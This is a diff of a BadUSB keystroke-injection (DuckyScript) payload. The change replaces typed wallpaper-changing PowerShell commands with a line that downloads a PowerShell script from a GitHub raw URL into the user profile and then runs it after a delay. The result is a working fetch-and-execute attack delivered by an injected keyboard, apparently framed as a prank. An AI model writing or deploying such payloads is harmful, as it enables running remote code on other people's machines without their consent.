@@ -10,32 +10,8 @@ ENTER
 DELAY 1000
 STRING y
 ENTER
-STRING echo "wget -Uri https://github.com/MeditationDuck/badusb/blob/main/image.jpg?raw=true -outfile $env:USERPROFILE\image.jpg
+STRING wget -Uri https://raw.githubusercontent.com/MeditationDuck/badusb/main/changeWallpaper.ps1 -outfile $env:USERPROFILE\\c.ps1
 ENTER
-STRING Set-ItemProperty -path `"HKCU:Control Panel\Desktop`" -name wallpaper -value $env:USERPROFILE\image.jpg
-ENTER
-STRING rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True
-ENTER
-STRING rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True
-ENTER
-STRING rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True
-ENTER
-STRING rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True
-ENTER
-STRING rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True
-ENTER
-STRING rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True
-ENTER
-STRING rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True
-ENTER
-STRING rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True
-ENTER
-STRING rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True
-ENTER
-STRING rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True
-ENTER
-STRING rm $env:USERPROFILE\image.jpg" >> change.ps1
-ENTER
-DELAY 2000
-STRING .\change.ps1
+DELAY 10000
+STRING .\c.ps1
 ENTER
